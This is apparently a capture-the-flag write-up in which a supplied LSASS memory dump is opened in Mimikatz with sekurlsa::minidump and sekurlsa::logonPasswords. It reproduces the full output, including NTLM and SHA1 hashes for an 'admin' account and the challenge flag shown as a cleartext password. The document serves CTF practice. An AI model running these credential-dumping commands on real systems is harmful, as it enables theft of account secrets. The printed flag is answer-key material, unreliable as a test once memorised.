# Nexioton

we are provided with a lsass.dmp file. Hence, this challenge is rather easy. Just use Mimikatz to dump out the lsass file.

```
  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # sekurlsa::minidump C:\Users\Scholar\Desktop\lsass\lsass.DMP
Switch to MINIDUMP : 'C:\Users\Scholar\Desktop\lsass\lsass.DMP'

mimikatz # sekurlsa::logonPasswords
Opening : 'C:\Users\Scholar\Desktop\lsass\lsass.DMP' file for minidump...

Authentication Id : 0 ; 271372 (00000000:0004240c)
Session           : Interactive from 1
User Name         : admin
Domain            : LNC24
Logon Server      : LNC24
Logon Time        : 19/1/2024 2:31:12 am
SID               : S-1-5-21-667958023-1762396816-3741999536-1000
        msv :
         [00000003] Primary
         * Username : admin
         * Domain   : LNC24
         * NTLM     : dc6a4dece9d4c218d2f3560ef6d935af
         * SHA1     : c1014f9bb4a25d38f7b44499a37502011f00dc9c
        tspkg :
         * Username : admin
         * Domain   : LNC24
         * Password : LNC24{death_is_like_the_wind}
        wdigest :
         * Username : admin
         * Domain   : LNC24
         * Password : LNC24{death_is_like_the_wind}
        kerberos :
         * Username : admin
         * Domain   : LNC24
         * Password : LNC24{death_is_like_the_wind}
        ssp :
        credman :

Authentication Id : 0 ; 271326 (00000000:000423de)
Session           : Interactive from 1
User Name         : admin
Domain            : LNC24
Logon Server      : LNC24
Logon Time        : 19/1/2024 2:31:12 am
SID               : S-1-5-21-667958023-1762396816-3741999536-1000
        msv :
         [00000003] Primary
         * Username : admin
         * Domain   : LNC24
         * NTLM     : dc6a4dece9d4c218d2f3560ef6d935af
         * SHA1     : c1014f9bb4a25d38f7b44499a37502011f00dc9c
        tspkg :
         * Username : admin
         * Domain   : LNC24
         * Password : LNC24{death_is_like_the_wind}
        wdigest :
         * Username : admin
         * Domain   : LNC24
         * Password : LNC24{death_is_like_the_wind}
        kerberos :
         * Username : admin
         * Domain   : LNC24
         * Password : LNC24{death_is_like_the_wind}
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 19/1/2024 2:31:02 am
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : LNC24$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 19/1/2024 2:31:02 am
SID               : S-1-5-20
        msv :
        tspkg :
        wdigest :
         * Username : LNC24$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : lnc24$
         * Domain   : WORKGROUP
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 46312 (00000000:0000b4e8)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 19/1/2024 2:31:02 am
SID               :
        msv :
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : LNC24$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 19/1/2024 2:31:02 am
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : LNC24$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : lnc24$
         * Domain   : WORKGROUP
         * Password : (null)
        ssp :
        credman :

mimikatz #
```

https://crypt0ace.github.io/posts/Dumping-Lsass/
